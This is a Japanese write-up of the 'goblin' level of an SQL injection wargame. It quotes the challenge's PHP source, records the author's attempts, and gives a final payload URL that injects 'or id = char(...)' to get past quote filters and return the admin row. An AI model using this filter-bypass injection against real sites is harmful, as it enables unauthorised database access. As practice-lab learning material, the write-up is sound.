# goblin

## answer

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2 or id = char(97,100,109,105,110)
```

## problem

```
query : select id from prob_goblin where id='guest' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## memo

これも問題を解く上ではきちんとコードだけ読めば一発でいけそうだが、私は紆余曲折するしここには紆余曲折も載せる。てゆうか解きながら書いてる。

てことで考える前に```?no=aaa```とかで試してみる。

```query : select id from prob_goblin where id='guest' and no=aaa```となった。まあそうか。


コードを読んでいく。

「prob」or「_」or「\.」or「\(\)」、「\\」、「"」、「`」これらが正規表現にマッチしたら、exit。

動きとしては、id=guestかつno='活用'のときのselectで値が引っかかったときにquery resultに何かしらの値が入る。

```if($result['id'] == 'admin') solve("goblin");```

とあるので、ログインが成功したあとでもDBから返ってきたidがadminになったときに問題が解ける。

ここで、UNION とかで検索結果を和集合にしたらいいんじゃないかと予想する。

```
select id from prob_goblin where id='guest' and no=aaa union select id from prob_goblin where id='admin'
```


このまま実行しようとするのでNo Quotesが出そうなので書き換えを考える。
'がフィルターされているときは"で置き換えるのがセオリーらしいが、"もフィルターされているのでどうしようかと悩む。

そこで、adminという文字列のASCII値をchar()関数で戻しながらexploitに注入する方向で考えてみる。

adminのASCII値を調べて条件に組み込む。

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=aaa union select id from prob_goblin where id = char(97, 100, 109, 105, 110)
```

を試してみると`No Hack ~_~`とでた。
`prob`とアンダースコアだ。笑 なぜ気が付かなかったんだろう。。。

そもそもunion句にする必要ないなとここらへんで気が付きました。

```
select id from prob_goblin where id='guest' and no=aaa or id='admin'
```

気を取り直してこのクエリを完成形で目指してエクスプロイトを考えたい。

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2 or id = char(97,100,109,105,110)
```

できた。


## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [BSides Delhi CTF 2018 Write up | こんとろーるしーこんとろーるぶい](https://graneed.hatenablog.com/entry/2018/10/26/232304)

- [ASCIIコード表 | TOMOJI blog](http://www9.plala.or.jp/sgwr-t/c_sub/ascii.html)

- [char and varchar type | my sql manual](https://dev.mysql.com/doc/refman/5.6/ja/char.html)